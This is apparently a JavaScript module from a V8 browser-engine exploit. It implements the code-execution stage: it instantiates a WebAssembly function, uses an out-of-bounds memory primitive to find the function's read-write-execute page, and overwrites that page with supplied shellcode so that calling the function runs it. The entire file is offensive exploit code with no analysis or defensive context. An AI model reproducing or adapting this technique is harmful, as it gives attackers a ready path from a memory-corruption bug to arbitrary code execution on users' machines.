function RCE(oob, shellcode){
    print("[ RCE ]");

    this.oob = oob;
    this.shellcode = shellcode;

    this.get_wasm_func = function () {
        print("  [*] Get WASM function.");
        var importObject = {
            imports: { imported_func: arg => console.log(arg) }
        };
        bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];
        wasm_code = new Uint8Array(bc);
        wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
        return wasm_mod.exports.exported_func;
    }

    this.get_RWX_mem = function (wasm_func) {
        print("  [*] Get RWX region.");
        let wasm_func_ptr = this.oob.objToPtr(wasm_func);
        print("  [*] wasm_func_ptr     : "+hex(wasm_func_ptr));
        let wasm_instance_ptr = this.oob.getUint32(BigInt(wasm_func_ptr+0x40)) + this.oob.external_ptr - 1;
        print("  [*] wasm_instance_ptr : "+hex(wasm_instance_ptr));
        let rwx_mem_ptr = this.oob.getUint64(BigInt(wasm_instance_ptr+0x68));
        print("  [*] rwx_mem_ptr       : "+hex(rwx_mem_ptr));

        return rwx_mem_ptr;
    }

    this.inject_shellcode = function(ptr_) {

        print("  [*] Inject shellcode.");
        for(let i=0, len=this.shellcode.length; i<len; i++){
            this.oob.setUint8(ptr_+BigInt(i), this.shellcode[i].charCodeAt());
        }

    }

    this.pwn_ready = function(){
        let wasm_func = this.get_wasm_func();
        let rwx_mem = this.get_RWX_mem(wasm_func);
        this.inject_shellcode(rwx_mem);
        this.pwn = wasm_func;
    }

    return this;
}